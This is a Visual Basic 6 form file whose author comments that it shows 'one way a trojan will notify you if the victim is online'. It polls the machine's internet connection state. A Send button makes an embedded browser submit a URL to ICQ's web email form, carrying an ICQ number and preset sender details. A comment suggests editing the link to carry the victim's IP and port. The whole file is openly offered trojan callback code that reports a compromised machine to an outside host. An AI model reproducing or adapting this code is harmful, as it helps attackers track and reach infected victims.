VERSION 5.00
Object = "{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}#1.1#0"; "shdocvw.dll"
Begin VB.Form Form1 
   Caption         =   "ICQ Notification"
   ClientHeight    =   3345
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   4680
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   3345
   ScaleWidth      =   4680
   StartUpPosition =   2  'CenterScreen
   Begin VB.CommandButton Command1 
      Caption         =   "Send"
      Height          =   255
      Left            =   2040
      TabIndex        =   4
      Top             =   360
      Width           =   1095
   End
   Begin VB.Timer Timer1 
      Interval        =   100
      Left            =   3960
      Top             =   240
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   240
      TabIndex        =   1
      Top             =   360
      Width           =   1695
   End
   Begin SHDocVwCtl.WebBrowser w1 
      Height          =   2055
      Left            =   240
      TabIndex        =   0
      Top             =   840
      Width           =   4215
      ExtentX         =   7435
      ExtentY         =   3625
      ViewMode        =   0
      Offline         =   0
      Silent          =   0
      RegisterAsBrowser=   0
      RegisterAsDropTarget=   1
      AutoArrange     =   0   'False
      NoClientEdge    =   0   'False
      AlignLeft       =   0   'False
      NoWebView       =   0   'False
      HideFileNames   =   0   'False
      SingleClick     =   0   'False
      SingleSelection =   0   'False
      NoFolders       =   0   'False
      Transparent     =   0   'False
      ViewID          =   "{0057D0E0-3573-11CF-AE69-08002B2E1262}"
      Location        =   ""
   End
   Begin VB.Label Label1 
      BackColor       =   &H00C0C0C0&
      BackStyle       =   0  'Transparent
      Caption         =   "Status"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   240
      TabIndex        =   3
      Top             =   3000
      Width           =   4215
   End
   Begin VB.Label Label1a 
      BackColor       =   &H00C0C0C0&
      BackStyle       =   0  'Transparent
      Caption         =   "ICQ#"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   240
      TabIndex        =   2
      Top             =   120
      Width           =   1695
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'BY: Mel Maranan
'One way a trojan will notify you if the victim is online
Option Explicit
'This will tell if your connected to the internet or not.
Private Declare Function InternetGetConnectedState Lib "wininet" (ldwFlags As Long, ByVal dwReserved As Long) As Boolean

Private Sub Command1_Click()
Dim site As String

'You can modify the link for it to show only the ip and the port or if you want to modify the senders name and etc.
'You can also go to icqs site to get how it really work.

site = "http://web.icq.com/friendship/email_thank_you/?failed_url=%2Ffriendship%2Fsend_by_email%2F&folder_id=18966&Extra_Params_Counte=0&nick_name=Labintador+&user_email=Labintador@yahoo.com&user_uin=" & Text1.Text & "&friend_nickname=You&friend_contact=" & Text1.Text & "&friend_nickname=&friend_contact=&x=55&y=10"
   w1.Navigate (site)
End Sub



Private Sub Form_Activate()
Text1.SetFocus
End Sub

Private Sub Timer1_Timer()
Dim flags As Long
Dim status As Boolean


    status = InternetGetConnectedState(flags, 0)
    If status Then
    Label1.Caption = "Online"
 

    Else
     Label1.Caption = "Offline"
    End If
End Sub
